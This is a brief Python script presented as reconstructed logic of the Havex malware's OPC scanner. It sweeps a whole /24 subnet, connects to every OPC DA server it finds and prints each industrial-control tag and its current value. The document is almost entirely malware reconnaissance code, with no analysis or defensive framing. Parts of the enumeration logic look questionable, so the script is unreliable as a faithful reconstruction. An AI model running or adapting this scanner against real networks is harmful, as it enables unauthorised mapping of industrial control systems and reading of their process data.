# Reconstructed Havex OPC scanner logic

import win32com.client

def scan_opc_servers(target_ip):
    """
    Enumerate OPC DA servers on target
    """
    opc_enum = win32com.client.Dispatch("OPC.Automation")

    try:
        servers = opc_enum.GetOPCServers(target_ip)
        print(f"[+] OPC Servers on {target_ip}:")
        for server in servers:
            print(f"  - {server}")

            # Connect to each server
            opc_server = win32com.client.Dispatch("OPC.Automation")
            opc_server.Connect(server, target_ip)

            # Enumerate tags
            groups = opc_server.OPCGroups
            for group in groups:
                items = group.OPCItems
                for item in items:
                    print(f"    Tag: {item.ItemID}, Value: {item.Value}")

            opc_server.Disconnect()

    except Exception as e:
        print(f"[-] Error: {e}")

# Havex scans entire subnet for OPC servers
for ip in range(1, 255):
    scan_opc_servers(f"192.168.1.{ip}")
